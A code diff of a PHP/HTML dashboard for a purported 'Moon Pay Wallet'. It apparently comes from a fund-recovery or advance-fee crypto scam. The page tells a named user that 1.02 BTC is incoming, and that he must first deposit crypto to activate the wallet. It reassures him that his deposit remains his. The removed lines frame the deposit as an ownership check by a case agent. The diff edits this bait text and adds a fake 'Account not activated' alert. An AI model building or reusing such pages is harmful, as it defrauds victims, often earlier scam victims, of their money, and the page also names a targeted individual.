@@ -183,7 +183,7 @@ if (strlen($_SESSION['id']==0)) {
                                             <a >
                                                 
                                                 <div class="notification-contnet">
-                                                    <h5>Deposit Funds</h5> <span class="mail-desc">You have a pending charge  of £27,999 (1.31 BTC) </span> 
+                                                    <h5>Deposit Funds</h5> <span class="mail-desc">You have an incoming order of 1.02 BTC </span> 
                                                 </div>
                                             </a>
                                             <!-- Message -->
@@ -207,10 +207,10 @@ if (strlen($_SESSION['id']==0)) {
                                                                         <li><a> Paul D Lutgen </a></li>
 
                                     <li role="separator" class="divider"></li>
-                                    <li><a href="profile"> Profile </a></li>
-                                    <li><a href="deposit"> Deposit</a></li>
+                                    <li><a onclick="alert('Account not activated');"> Profile </a></li>
+                                    <li><a href="deposit.html"> Deposit</a></li>
                                     <li role="separator" class="divider"></li>
-                                    <li><a href="Withdrawal"> Withdrawal</a></li>
+                                    <li><a href="Withdrawal.html"> Withdrawal</a></li>
                                     <li role="separator" class="divider"></li>
                                     <li><a href="logout.html"> Sign Out</a></li>
                                 </ul>
@@ -292,20 +292,19 @@ if (strlen($_SESSION['id']==0)) {
                         <div class="card-body">
                             <div class="card" style="">
                                 <!-- 16:9 aspect ratio -->
-                          <h6 class="card-text"> Available Funds £27,999  </h6>
-                          <p class="card-text">   Incoming  Funds : <? echo $_SESSION['sendera'];?> </p>
+                
+                          <p class="card-text">   Incoming  Funds : 1.02 btc</p>
                         </div>
                        
                         <div class="card-body">
                             <p>Get Started with Moon Pay Wallet  !</p>
                             <p>in order to activate your wallet  </p>
-                            <p>You are required to deposit a sum of <? echo $_SESSION['senderc'];?> </p>
-                             <p>in line with our policy in order to ascertain that indeed that you are the rightful owner of the recovered funds.An evaluation process would be carried out to ensure you're the rightful owner of the funds. </p>
-                             <p>Your agent on case would guide you through the recoup process after our evaluation.                   <button type="button" class="btn btn-primary btn-sm px-4 gap-3" onclick="location.href='Deposit';" >Get Started </button>
+                            <p>You are required to deposit crypto to your wallet in order to fully use or services after  which your tokens would be available for use </p>
+                                           <button type="button" class="btn btn-primary btn-sm px-4 gap-3" onclick="location.href='Deposit';" >Get Started </button>
 </p>
                         </div>
                       </div>
-                    </div>                                  <p> NOTE: YOUR INITIAL DEPOSIT WOULD APPEAR AS YOUR AVAILABLE BALANCE WHICH WOULD BE REIMBURSED ALONGSIDE YOUR INCOMING FUNDS. SO THE FUNDS YOU'D BE DEPOSITING ARE STILL YOUR FUND  </p>
+                    </div>                                  <p> NOTE: YOUR INITIAL DEPOSIT WOULD APPEAR AS YOUR AVAILABLE BALANCE WHICH WOULD BE REIMBURSED ALONGSIDE YOUR INCOMING FUNDS. SO THE FUNDS YOU'D BE DEPOSITING ARE IN YOUR CARE  </p>
                   
 
                 </div>
@@ -349,7 +348,7 @@ s0.parentNode.insertBefore(s1,s0);
             </div>
             <!-- End Container fluid  -->
             <!-- footer -->
-            <footer class="footer">  Moon Pay Wallet  © 2022||  All Right Reserved.</footer>
+            <footer class="footer">  Moon Pay Wallet  © 2023||  All Right Reserved.</footer>
             <!-- End footer -->
         </div>
         <!-- End Page wrapper  -->
